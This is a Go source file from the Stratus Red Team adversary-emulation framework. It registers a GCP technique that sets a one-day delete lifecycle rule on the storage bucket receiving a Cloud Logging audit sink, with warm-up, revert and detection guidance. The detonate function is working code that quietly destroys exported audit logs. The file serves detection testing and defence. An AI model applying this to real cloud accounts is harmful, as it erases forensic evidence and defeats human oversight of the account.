package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	storagev1 "google.golang.org/api/storage/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.reduce-sink-log-retention",
		FriendlyName: "Reduce Log Retention Period on a Cloud Logging Sink Bucket",
		Description: `
Sets a 1-day object lifecycle rule on the GCS bucket used by a Cloud Logging sink,
causing exported audit logs to be automatically deleted after one day.

This is the GCP equivalent of the AWS CloudTrail lifecycle rule technique: rather than
deleting the sink or disabling it (which raises an immediate alert), the attacker
quietly shortens the retention window of the underlying storage bucket to minimize
the forensic footprint of their activity.

Warm-up:

- Create a GCS bucket
- Create a log sink exporting audit logs (<code>cloudaudit.googleapis.com</code>) to the bucket

Detonation:

- Apply a GCS lifecycle rule on the log sink bucket that deletes all objects after 1 day

Revert:

- Remove the lifecycle rule from the bucket

References:

- https://cloud.google.com/storage/docs/lifecycle
- https://www.justice.gov/usao-sdny/press-release/file/1452706/download
`,
		Detection: `
Identify when a lifecycle rule with a short expiration is applied to a GCS bucket used
for Cloud Logging export. Monitor for <code>storage.buckets.update</code> events in
GCP Data Access audit logs where the request sets a lifecycle rule with a short
expiration on a bucket associated with a logging sink.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newStorageService(providers stratus.CloudProviders) (*storagev1.Service, error) {
	svc, err := storagev1.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Storage client: %w", err)
	}
	return svc, nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]

	svc, err := newStorageService(providers)
	if err != nil {
		return err
	}

	oneDayAge := int64(1)
	log.Printf("Setting 1-day object lifecycle rule on log sink bucket %s\n", bucketName)
	_, err = svc.Buckets.Patch(bucketName, &storagev1.Bucket{
		Lifecycle: &storagev1.BucketLifecycle{
			Rule: []*storagev1.BucketLifecycleRule{
				{
					Action:    &storagev1.BucketLifecycleRuleAction{Type: "Delete"},
					Condition: &storagev1.BucketLifecycleRuleCondition{Age: &oneDayAge},
				},
			},
		},
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to set lifecycle rule on bucket %s: %w", bucketName, err)
	}

	log.Printf("Successfully set 1-day retention rule on bucket %s — exported logs will be deleted after 1 day\n", bucketName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]

	svc, err := newStorageService(providers)
	if err != nil {
		return err
	}

	log.Printf("Removing lifecycle rule from log sink bucket %s\n", bucketName)
	_, err = svc.Buckets.Patch(bucketName, &storagev1.Bucket{
		NullFields: []string{"Lifecycle"},
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to remove lifecycle rule from bucket %s: %w", bucketName, err)
	}

	log.Printf("Successfully removed lifecycle rule from bucket %s\n", bucketName)
	return nil
}
